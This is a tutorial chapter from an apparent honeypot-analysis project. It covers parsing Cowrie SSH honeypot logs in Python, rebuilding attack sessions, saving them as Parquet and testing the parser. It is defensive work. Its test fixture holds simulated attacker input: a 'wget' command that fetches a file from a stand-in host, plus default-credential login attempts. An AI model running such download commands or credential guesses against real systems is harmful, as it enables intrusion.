# Phase 2 — Ingestion and Structuring of Logs

> In this phase, you begin to make sense of what the honeypot captures. You have (or are accumulating) a lot of records in `cowrie.json`, rich but raw: a flat stream of thousands of separate events. Your job here is to convert that stream into structured and analyzable data. There is an idea that is worth keeping clear from the very beginning, as it is the central transformation of this phase: logs are a torrent of individual *events* (a connection, a login attempt, a command...), but the unit that truly matters for analysis is the **session**: the complete interaction of an attacker, from the moment they connect until they leave. Reconstructing those sessions from separate events is what turns a chaos of lines into a coherent set of "attack stories" that you can actually analyze.

**Phase Objective:** Convert raw logs into structured and analyzable data.  
**Duration:** Weeks 2–3.  
**Upon completion, you will have:** A robust pipeline that reads Cowrie's JSON logs and reconstructs attack sessions (each with its source IP, credential attempts, commands, and downloads), leaving the data clean and ready to enrich and analyze.

---

## The Big Picture

The workflow of this phase transforms raw events into structured sessions:

```
   cowrie.json (raw event stream)
        │
        ▼
   [ 1. Read the events ]  ──►  line by line, robust (parse by key)
        │
        ▼
   [ 2. Reconstruct sessions ]  ──►  group events by session
        │
        ▼
   [ 3. Structured output ]  ──►  one row per session: IP, credentials, commands, downloads
                                   (ready to enrich in Phase 3)
```

---

## Step 1 — Understanding the Cowrie Log Format

Before parsing, you need to understand the format, because all your code depends on it. `cowrie.json` is a **JSON lines** file: one JSON object per line, each representing an **event**. Each event has an `eventid` field indicating its type, along with a series of shared fields: `session` (a unique session identifier), `src_ip` (the attacker's IP), `timestamp`, `protocol`, `dst_port`, etc.

The `eventid` values that interest you most are the following, and knowing them is what allows you to extract meaningful information:

| eventid | What it represents | Key fields |
|---------|--------------------|------------|
| `cowrie.session.connect` | A new connection | `src_ip`, `protocol`, `timestamp` |
| `cowrie.login.success` | Successful login | `username`, `password` |
| `cowrie.login.failed` | Failed login | `username`, `password` |
| `cowrie.command.input` | A command typed by the attacker | `input` |
| `cowrie.session.file_download` | A download attempt | `url`, `shasum` |
| `cowrie.session.closed` | Session end | `duration` |

And here is a detail that shows experience and avoids a real error (documented in Cowrie's own repository): **the order of keys within each JSON line can vary** from one line to another. This means a naive parser relying on field order will break. The correct way is to parse each line with `json.loads()` and access the fields **by their key**, also using `.get()` instead of bracket notation, because not all events contain all fields (for example, a connection event does not have an `input` field) and `.get()` avoids missing key errors. Keeping this in mind from the beginning will save you a headache.

---

## Step 2 — Reading Events Robustly

You start with a reader that iterates through the logs event by event, applying the data rigor you already practiced in MLOps. Complete `src/ingestion/parse_logs.py`:

```python
import json
from pathlib import Path
from typing import Iterator


def read_events(log_dir: Path) -> Iterator[dict]:
    """Reads all events from Cowrie's JSON logs, line by line."""
    # Cowrie rotates logs: cowrie.json, cowrie.json.2026-06-13, etc.
    for log_file in sorted(log_dir.glob("cowrie.json*")):
        with open(log_file, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    yield json.loads(line)
                except json.JSONDecodeError:
                    continue  # ignore corrupted lines, do not break the pipeline
```

Notice several robustness-focused design choices. It is a **generator** (`yield`), which means it reads the events one by one without loading the entire file into memory: this is crucial for **handling volume**, as an active honeypot can generate massive files, and a generator processes them as a stream without exhausting memory. It traverses **all** log files (Cowrie rotates them by date, so they must be collected using a pattern). It ignores empty and **corrupt** lines (using `try/except`), so a malformed line doesn't bring down the entire process. This is the kind of defensive care that distinguishes a production data pipeline from a fragile script.

---

## Step 3 — Reconstructing Sessions: The Central Transformation

This is the key step of the phase. Events arrive separate and interleaved (events from many different sessions mixed together), and you want to group them by **session** to reconstruct the complete interaction of each attacker. The `session` identifier is what allows you to do this: all events from the same interaction share the same `session`. You iterate through the events, group them by their `session`, and based on each one's `eventid`, fill in the information for that session:

```python
from collections import defaultdict

import pandas as pd


def build_sessions(events: Iterator[dict]) -> pd.DataFrame:
    """Reconstructs attack sessions from the event stream."""
    sessions: dict[str, dict] = defaultdict(lambda: {
        "src_ip": None, "protocol": None, "timestamp": None,
        "login_attempts": [], "login_success": False,
        "commands": [], "downloads": [], "duration": None,
    })

    for ev in events:
        sid = ev.get("session")
        if sid is None:
            continue
        s = sessions[sid]
        eventid = ev.get("eventid", "")

        if eventid == "cowrie.session.connect":
            s["src_ip"] = ev.get("src_ip")
            s["protocol"] = ev.get("protocol")
            s["timestamp"] = ev.get("timestamp")
        elif eventid in ("cowrie.login.success", "cowrie.login.failed"):
            s["login_attempts"].append({
                "username": ev.get("username"),
                "password": ev.get("password"),
                "success": eventid.endswith("success"),
            })
            if eventid.endswith("success"):
                s["login_success"] = True
        elif eventid == "cowrie.command.input":
            s["commands"].append(ev.get("input"))
        elif eventid == "cowrie.session.file_download":
            s["downloads"].append(ev.get("url"))
        elif eventid == "cowrie.session.closed":
            s["duration"] = ev.get("duration")

    rows = [
        {
            "session": sid,
            "src_ip": s["src_ip"],
            "protocol": s["protocol"],
            "timestamp": s["timestamp"],
            "n_login_attempts": len(s["login_attempts"]),
            "login_success": s["login_success"],
            "n_commands": len(s["commands"]),
            "commands": s["commands"],
            "n_downloads": len(s["downloads"]),
            "download_urls": s["downloads"],
            "duration": s["duration"],
        }
        for sid, s in sessions.items()
    ]
    return pd.DataFrame(rows)
```

What you achieve with this is the transformation that adds value to the phase: you go from a flat event stream to a table where **each row is a complete attack session**, along with its source IP, how many credentials it tested and whether it succeeded, what commands it executed, what it tried to download, and how long it lasted. A session is, in essence, the story of what an attacker did in your decoy, and now you have it summarized and structured. This is the level at which analysis makes sense: not "there were 40,000 events", but "there were 3,000 attack sessions, and this is what each one did."

---

## Step 4 — Structured Output

With the sessions reconstructed, you save the result in an efficient format for the upcoming phases to load. It is also useful to convert the `timestamp` to a real datetime type, which is helpful for subsequent temporal analysis. Complete the module's `main` block:

```python
if __name__ == "__main__":
    from src.config import LOG_DIR

    df = build_sessions(read_events(LOG_DIR))
    df["timestamp"] = pd.to_datetime(df["timestamp"], errors="coerce")

    print(f"Reconstructed sessions: {len(df)}")
    print(f"Sessions with successful login: {df['login_success'].sum()}")
    print(df[["src_ip", "n_login_attempts", "n_commands", "protocol"]].head())

    df.to_parquet("data/sessions.parquet")
```

Saving in Parquet format (instead of CSV) is a great choice for structured data like this: it is more compact, faster to read, and preserves data types (including columns containing lists, such as commands). This `sessions.parquet` is the phase's deliverable: the captured attacks, now in a clean and structured form, ready for Phase 3 to add context. And here, a decision from the previous phase pays off: since in Phase 1 you made sure to preserve the attacker's **real IP** (via Docker port mapping), the `src_ip` field of each session is the genuine IP, ready to be geolocated and cross-referenced with threat intelligence sources.

---

## Step 5 — Testing

Verify that session reconstruction works, which is easy to test using sample in-memory events (no honeypot required). Complete `tests/test_ingestion.py`:

```python
from src.ingestion.parse_logs import build_sessions


def test_reconstruct_one_session():
    events = [
        {"eventid": "cowrie.session.connect", "session": "abc",
         "src_ip": "1.2.3.4", "protocol": "ssh", "timestamp": "2026-06-13T10:00:00Z"},
        {"eventid": "cowrie.login.failed", "session": "abc",
         "username": "root", "password": "1234"},
        {"eventid": "cowrie.login.success", "session": "abc",
         "username": "root", "password": "admin"},
        {"eventid": "cowrie.command.input", "session": "abc", "input": "uname -a"},
        {"eventid": "cowrie.command.input", "session": "abc", "input": "wget http://malo/x"},
        {"eventid": "cowrie.session.closed", "session": "abc", "duration": 12.5},
    ]
    df = build_sessions(iter(events))

    assert len(df) == 1
    row = df.iloc[0]
    assert row["src_ip"] == "1.2.3.4"
    assert row["n_login_attempts"] == 2
    assert row["login_success"] is True
    assert row["n_commands"] == 2


def test_events_from_different_sessions_do_not_mix():
    events = [
        {"eventid": "cowrie.session.connect", "session": "a", "src_ip": "1.1.1.1"},
        {"eventid": "cowrie.session.connect", "session": "b", "src_ip": "2.2.2.2"},
        {"eventid": "cowrie.command.input", "session": "a", "input": "ls"},
    ]
    df = build_sessions(iter(events))
    assert len(df) == 2
    session_a = df[df["session"] == "a"].iloc[0]
    assert session_a["n_commands"] == 1
```

The first test verifies that a session is reconstructed with all its information (IP, attempts, successful login, commands). The second test verifies that events from different sessions do not mix, which is the core of the reconstruction process. Run them with `make test`.

---

## Verification: The "Definition of Done"

This phase is complete when the following conditions are met:

- [ ] `parse_logs.py` reads Cowrie's JSON logs robustly (parsing by key, ignoring corrupted lines, traversing all rotated files).
- [ ] Reconstructs attack sessions by grouping events by their session identifier.
- [ ] Each session is structured with its key information (IP, credential attempts, commands, downloads, duration).
- [ ] The pipeline handles volume (stream processing, without running out of memory).
- [ ] The result is saved in a structured and efficient format.
- [ ] **The key test:** you have the captured attacks in a structured and clean format, ready to be enriched and analyzed.

The key test is the transformation achieved: if you have gone from a `cowrie.json` filled with chaotic, raw events to a table where each row is a coherent, clean attack session, you have taken the first fundamental step to turn data into intelligence. Remember the core idea of the project: capturing was easy, making sense of it is where the value lies; and structuring the data is the first link in that "making sense" chain.

---

## Deliverables and What Comes Next

By closing Phase 2, you have the captured attacks converted into structured data: a clean set of sessions, each containing the story of what an attacker did in your decoy. You have applied the data engineering rigor of MLOps (robustness against dirty data, stream volume handling) to a new and challenging data type, and you have carried out the central transformation of turning disparate events into coherent sessions. You now have the foundation upon which all analysis will be built.

The next step, **Phase 3**, begins to convert this data into intelligence: **enrichment**. Your sessions contain each attacker's IP, but an IP alone tells you very little. You will add context: where it comes from (geolocation), if it is already known for malicious activity (cross-referencing it with threat intelligence sources), and other useful data points. This is what transforms "an IP did X" into "an IP from country Y, with reputation Z, did X", which is actual intelligence. You have moved from "I have structured attacks" to being on the verge of "I have contextualized attacks, ready to analyze in depth."
